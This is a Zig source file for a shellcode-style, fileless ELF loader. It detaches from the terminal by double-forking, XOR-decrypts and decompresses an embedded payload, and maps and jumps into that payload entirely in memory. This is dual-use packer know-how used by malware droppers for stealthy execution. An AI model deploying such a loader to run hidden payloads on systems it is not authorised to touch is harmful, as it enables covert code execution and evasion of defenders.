const std = @import("std");
const builtin = @import("builtin");
const depack = @import("depack.zig");
const elf = @import("struct.zig");
const linux = std.os.linux;
const string = []const u8;

pub const std_options = struct {
    pub const log_level = if (builtin.output_mode == .Exe) .info else .err;
};

// MAP_FAILED: mmap returns -1 on failure (as usize)
const MAP_FAILED_USIZE: usize = @bitCast(@as(isize, -1));

// ============================================================
// Raw syscall wrappers (inline, no libc dependency)
// ============================================================

inline fn sys_mmap(addr: usize, len: usize, prot: usize, flags: usize, fd: usize, offset: usize) usize {
    return linux.syscall6(.mmap, addr, len, prot, flags, fd, offset);
}

inline fn sys_mprotect(addr: usize, len: usize, prot: usize) usize {
    return linux.syscall3(.mprotect, addr, len, prot);
}

fn sys_exit(code: usize) noreturn {
    _ = linux.syscall1(.exit, code);
    unreachable;
}

inline fn sys_fork() usize {
    return linux.syscall0(.fork);
}

inline fn sys_wait4(pid: usize, wstatus: usize, options: usize, rusage: usize) usize {
    return linux.syscall4(.wait4, pid, wstatus, options, rusage);
}

inline fn sys_setsid() usize {
    return linux.syscall0(.setsid);
}

inline fn sys_open(path: [*:0]const u8, flags: usize, mode: usize) usize {
    return linux.syscall3(.open, @intFromPtr(path), flags, mode);
}

inline fn sys_dup2(oldfd: usize, newfd: usize) usize {
    return linux.syscall2(.dup2, oldfd, newfd);
}

inline fn sys_close(fd: usize) usize {
    return linux.syscall1(.close, fd);
}

inline fn sys_chdir(path: [*:0]const u8) usize {
    return linux.syscall1(.chdir, @intFromPtr(path));
}

inline fn sys_getpid() usize {
    return linux.syscall0(.getpid);
}

inline fn sys_write(fd: usize, buf: [*]const u8, count: usize) usize {
    return linux.syscall3(.write, fd, @intFromPtr(buf), count);
}

// ============================================================
// Helper functions
// ============================================================

inline fn ELF64_R_TYPE(info: u64) u32 {
    return @truncate(info);
}

inline fn syscallFailed(rc: usize) bool {
    return rc > @as(usize, @bitCast(@as(isize, -4096)));
}

// ============================================================
// Build initial stack layout per x86_64 System V ABI
// Reuses the current stack (like alloca in C version).
// ============================================================

inline fn buildStack(
    argc: usize,
    argv: [*c][*c]const u8,
    envp: [*c][*c]u8,
    phdr_addr: usize,
    phdr_num: usize,
    e_entry: usize,
) usize {
    // Count environment variables
    var envc: usize = 0;
    if (envp != null) {
        while (envp[envc] != null) : ({
            envc += 1;
        }) {}
    }

    // Auxiliary vector: 6 data entries + AT_NULL terminator = 7 pairs
    const auxv_pairs: usize = 7;
    // AT_RANDOM needs 16 bytes of random data
    const random_data_size: usize = 16;

    // Total number of 8-byte slots
    const n_slots = 1 + (argc + 1) + (envc + 1) + (auxv_pairs * 2);
    const frame_size = n_slots * @sizeOf(usize);

    // Allocate on the current stack as a local array
    // (compiler-managed, unlike sub %rsp which breaks the frame)
    // 512 usize = 4096 bytes; truncate envp if needed
    const max_buf = 512;
    const max_frame = max_buf * @sizeOf(usize) - random_data_size;
    const fit_envc = if (frame_size > max_frame) blk: {
        const auxv_size = auxv_pairs * 2 * @sizeOf(usize);
        const overhead = (1 + (argc + 1) + 1) * @sizeOf(usize) + auxv_size;
        const avail = max_frame -| overhead;
        break :blk avail / @sizeOf(usize);
    } else envc;
    const actual_n_slots = 1 + (argc + 1) + (fit_envc + 1) + (auxv_pairs * 2);
    const actual_frame_size = actual_n_slots * @sizeOf(usize);
    var buf: [max_buf]usize = undefined;
    const alloc_ptr: usize = @intFromPtr(&buf);

    // Align the frame start to 16 bytes
    const frame_start = (alloc_ptr + 15) & ~@as(usize, 15);
    var random_data: [*c]u8 = @ptrFromInt(frame_start + actual_frame_size);

    // Fill random data for AT_RANDOM
    for (0..random_data_size) |i| {
        random_data[i] = @truncate(i ^ 0x5a);
    }
    const random_addr = @intFromPtr(random_data);

    // Build the frame from bottom (low address) upward
    var sp: [*c]usize = @ptrFromInt(frame_start);

    // argc
    sp[0] = argc;
    sp += 1;

    // argv pointers
    for (0..argc) |i| {
        sp[0] = @intFromPtr(argv[i]);
        sp += 1;
    }
    sp[0] = 0;
    sp += 1;

    // envp pointers (truncated if too many)
    for (0..fit_envc) |i| {
        sp[0] = @intFromPtr(envp[i]);
        sp += 1;
    }
    sp[0] = 0;
    sp += 1;

    // Auxiliary vector
    sp[0] = elf.AT_PHDR;
    sp[1] = phdr_addr;
    sp += 2;
    sp[0] = elf.AT_PHNUM;
    sp[1] = phdr_num;
    sp += 2;
    sp[0] = elf.AT_PHENT;
    sp[1] = @sizeOf(elf.Elf64_Phdr);
    sp += 2;
    sp[0] = elf.AT_PAGESZ;
    sp[1] = pagesize;
    sp += 2;
    sp[0] = elf.AT_ENTRY;
    sp[1] = e_entry;
    sp += 2;
    sp[0] = elf.AT_RANDOM;
    sp[1] = random_addr;
    sp += 2;
    sp[0] = elf.AT_NULL;
    sp[1] = 0;
    sp += 2;

    return frame_start;
}

// ============================================================
// Load and run ELF from memory
// ============================================================
const pagesize = 4096;
inline fn load_and_run(elf_contents: [*c]u8, elf_size: usize, argc: usize, argv: [*c][*c]const u8, envp: [*c][*c]u8) void {
    _ = elf_size;
    // validateElf(elf_contents, elf_size);

    var eh: *elf.Elf64_Ehdr = @ptrCast(@alignCast(elf_contents));
    var e_phoff = eh.e_phoff;
    var e_phnum = eh.e_phnum;

    var phdrs: [*c]elf.Elf64_Phdr = @ptrCast(@alignCast(elf_contents + @as(usize, @intCast(e_phoff))));

    var mask: usize = pagesize - 1;

    var min_vaddr: usize = @bitCast(@as(i64, -1));
    var max_vaddr: u64 = 0;

    // Find min/max vaddr across LOAD segments
    for (0..e_phnum) |i| {
        var ph = &phdrs[i];
        if (ph.p_type != elf.PT_LOAD)
            continue;
        if (ph.p_vaddr < min_vaddr)
            min_vaddr = ph.p_vaddr;
        if (ph.p_vaddr + ph.p_memsz > max_vaddr)
            max_vaddr = ph.p_vaddr + ph.p_memsz;
    }

    var aligned_min = min_vaddr & ~@as(u64, mask);
    var total_size = (max_vaddr - aligned_min + mask) & ~@as(u64, mask);

    // Reserve address space via raw syscall
    var reserved_int = sys_mmap(0, total_size, 0, linux.MAP.PRIVATE | linux.MAP.ANONYMOUS, @bitCast(@as(isize, -1)), 0);
    if (reserved_int == MAP_FAILED_USIZE) {
        std.log.info("[x]mmap reserve", .{});
        sys_exit(3);
    }

    var load_base = reserved_int - @as(usize, @intCast(aligned_min));

    std.log.info("[+]load_base: 0x{X} total_size: {}", .{ load_base, total_size });

    // Map each LOAD segment
    for (0..e_phnum) |i| {
        var ph = &phdrs[i];
        if (ph.p_type != elf.PT_LOAD)
            continue;

        var seg_page_vaddr: usize = @intCast(ph.p_vaddr & ~@as(u64, mask));
        var seg_page_offset: usize = @intCast(ph.p_vaddr - seg_page_vaddr);
        var map_size: usize = @intCast((seg_page_offset + ph.p_memsz + mask) & ~@as(u64, mask));

        var target_addr: usize = load_base + seg_page_vaddr;
        var seg_int = sys_mmap(target_addr, map_size, linux.PROT.READ | linux.PROT.WRITE, linux.MAP.PRIVATE | linux.MAP.ANONYMOUS | linux.MAP.FIXED, @bitCast(@as(isize, -1)), 0);
        if (seg_int == MAP_FAILED_USIZE) {
            std.log.info("[x]mmap failed", .{});
            sys_exit(4);
        }

        // Copy file data into segment
        if (ph.p_filesz > 0) {
            var seg: [*c]u8 = @ptrFromInt(seg_int);
            var src: [*c]u8 = elf_contents + @as(usize, @intCast(ph.p_offset));
            var filesz: usize = @intCast(ph.p_filesz);
            std.mem.copyForwards(u8, seg[seg_page_offset .. seg_page_offset + filesz], src[0..filesz]);
        }

        // Set correct memory protections
        var mem_protect: usize = 0;
        if (ph.p_flags & elf.PF_R != 0)
            mem_protect |= linux.PROT.READ;
        if (ph.p_flags & elf.PF_W != 0)
            mem_protect |= linux.PROT.WRITE;
        if (ph.p_flags & elf.PF_X != 0)
            mem_protect |= linux.PROT.EXEC;

        _ = sys_mprotect(seg_int, map_size, mem_protect);
    }

    // Relocation logic
    var dyn: [*c]elf.Elf64_Dyn = null;
    for (0..e_phnum) |i| {
        if (phdrs[i].p_type == elf.PT_DYNAMIC) {
            dyn = @ptrFromInt(load_base + @as(usize, @intCast(phdrs[i].p_vaddr)));
            break;
        }
    }
    if (@intFromPtr(dyn) == 0) {
        std.log.info("[x]PIE without PT_DYNAMIC", .{});
        sys_exit(5);
    }

    var rela: [*c]elf.Elf64_Rela = null;
    var rela_sz: usize = 0;

    var d = dyn;
    while (d.*.d_tag != elf.DT_NULL) : ({
        d += 1;
    }) {
        if (d.*.d_tag == elf.DT_RELA)
            rela = @ptrFromInt(load_base + @as(usize, @intCast(d.*.d_un.d_ptr)))
        else if (d.*.d_tag == elf.DT_RELASZ)
            rela_sz = @intCast(d.*.d_un.d_val);
    }

    std.log.info("[+]reloc rela:{*} sz:{}", .{ rela, rela_sz });
    var rela_cnt = rela_sz / @sizeOf(elf.Elf64_Rela);
    for (0..rela_cnt) |i| {
        var r = &rela[i];
        if (ELF64_R_TYPE(r.r_info) == elf.R_X86_64_RELATIVE) {
            var ptr: *align(1) u64 = @ptrFromInt(load_base + @as(usize, @intCast(r.r_offset)));
            ptr.* = @intCast(load_base + @as(usize, @bitCast(r.r_addend)));
        } else {
            std.log.info("[x]unsupported relocation: {}", .{ELF64_R_TYPE(r.r_info)});
            sys_exit(6);
        }
    }

    // Calculate AT_PHDR
    var phdr_addr: usize = 0;
    for (0..e_phnum) |i| {
        var ph = &phdrs[i];
        if (ph.p_type == elf.PT_LOAD and
            e_phoff >= ph.p_offset and
            e_phoff < ph.p_offset + ph.p_filesz)
        {
            phdr_addr = load_base + @as(usize, @intCast(ph.p_vaddr - ph.p_offset)) + @as(usize, @intCast(e_phoff));
            break;
        }
    }
    if (phdr_addr == 0) {
        std.log.info("[x]cannot locate program headers", .{});
        sys_exit(7);
    }

    var entry_point = load_base + @as(usize, @intCast(eh.e_entry));
    std.log.info("[+]entry point: 0x{X}", .{entry_point});

    var stack_top = buildStack(argc, argv, envp, phdr_addr, e_phnum, entry_point);

    // Transfer control to entry point via inline assembly
    asm volatile (
        \\mov %[stack], %%rsp
        \\xor %%rbp, %%rbp
        \\xor %%rdx, %%rdx
        \\jmp *%[entry]
        :
        : [stack] "r" (stack_top),
          [entry] "r" (entry_point),
        : "memory", "cc", "rdx", "rsi", "rcx", "rbx", "rdi", "rax"
    );
    unreachable;
}

pub export fn go(output_file: [*c]const u8, argc: usize, argv: [*c][*c]const u8, envp: [*c][*c]u8, data: [*c]u8) void {
    // data结构
    // 1. elf原始大小    4个字节
    // 2. elf压缩后大小  4个字节
    // 3. 解密key        128个字节
    // 4. 压缩加密的elf数据

    // Double fork: 让当前进程成为 1 号进程的子进程（脱离终端）
    {
        const pid1 = sys_fork();
        if (syscallFailed(pid1)) {
            // 失败返回
            return;
        }
        if (pid1 > 0) {
            // 父进程等待第一个子进程，避免僵尸进程
            _ = sys_wait4(pid1, 0, 0, 0);
            return;
        }
        // 第一个子进程: setsid 成为新会话组长
        _ = sys_setsid();

        const pid2 = sys_fork();
        if (syscallFailed(pid2)) {
            sys_exit(11);
        }
        if (pid2 > 0) {
            // 第一个子进程也退出
            sys_exit(0);
        }
        // 第二个子进程不再是会话组长，完全脱离控制终端
    }
    // 切换到tmp目录
    var tmp_path = "/tmp".*;
    _ = sys_chdir(@ptrCast(&tmp_path));

    // 重定向 stdout(1) 和 stderr(2) 到临时文件
    if (output_file != null and output_file[0] != 0) {
        std.log.info("[+]output to {s}\n", .{output_file});

        const O_WRONLY: usize = 1;
        const O_CREAT: usize = 64;
        const O_APPEND: usize = 1024;
        const mode_0644: usize = 0o644;

        const fd = sys_open(output_file, O_WRONLY | O_CREAT | O_APPEND, mode_0644);
        if (!syscallFailed(fd)) {
            _ = sys_dup2(fd, 1); // stdout
            _ = sys_dup2(fd, 2); // stderr
            if (fd > 2) {
                _ = sys_close(fd);
            }
        }
    }

    std.log.info("[+]argc:{}", .{argc});

    var i: usize = 0;
    while (i < argc) : (i += 1) {
        if (argv[i] != null) {
            std.log.info("[+]argv[{}]: {s}", .{ i, argv[i] });
        }
    }

    var p = data;
    // 1. 读取rlen和packlen
    var ptr: [*c]align(1) u32 = @ptrCast(p);
    var rlen = ptr[0];
    var packlen = ptr[1];
    p += 8;

    if (rlen < packlen) {
        std.log.info("[x]rlen <= packlen", .{});
        sys_exit(1);
    }

    // 2. 读取key
    var keyBytes = p[0..128];
    p += 128;

    std.log.info("[+]rlen:{} packlen:{}", .{ rlen, packlen });
    std.log.info("[+]keyBytes: {s}", .{std.fmt.fmtSliceHexLower(keyBytes)});
    // 3. 解密数据
    var packdata = p[0..packlen];
    for (0..packdata.len) |j| {
        packdata[j] ^= keyBytes[j % keyBytes.len];
    }
    // 5. 解压数据
    var unpacked_addr = sys_mmap(0, rlen, linux.PROT.READ | linux.PROT.WRITE, linux.MAP.PRIVATE | linux.MAP.ANONYMOUS, @bitCast(@as(isize, -1)), 0);
    if (unpacked_addr == MAP_FAILED_USIZE) {
        std.log.info("[x]mmap unpacked", .{});
        sys_exit(2);
    }
    std.log.info("[+]decompress src:0x{X} dst:0x{X}", .{ @intFromPtr(packdata.ptr), unpacked_addr });
    _ = depack.aP_depack(packdata.ptr, @ptrFromInt(unpacked_addr));
    // 6. 调用load_and_run
    var unpacked: [*c]u8 = @ptrFromInt(unpacked_addr);
    load_and_run(unpacked, rlen, argc, argv, envp);
}
pub export fn goEnd() void {}

pub fn readFile(filename: []const u8, allocator: std.mem.Allocator) ![]u8 {
    var f = try std.fs.cwd().openFile(filename, .{});
    defer f.close();
    var size = try f.getEndPos();
    var data = try allocator.alloc(u8, @truncate(size));
    _ = try f.readAll(data);
    return data;
}
pub fn main() void {
    var allocator = std.heap.page_allocator;
    var data = readFile(
        "busybox.sc",
        allocator,
    ) catch {
        std.log.err("Failed to read file", .{});
        return;
    };
    data = data[5..];

    // Build envp from std.os.environ
    var envp: [*c][*c]u8 = @ptrCast(std.os.environ.ptr);
    var argv: [*c][*c]const u8 = @ptrCast(&std.os.argv[1]);
    go("output", std.os.argv.len - 1, argv, envp, data.ptr);
}
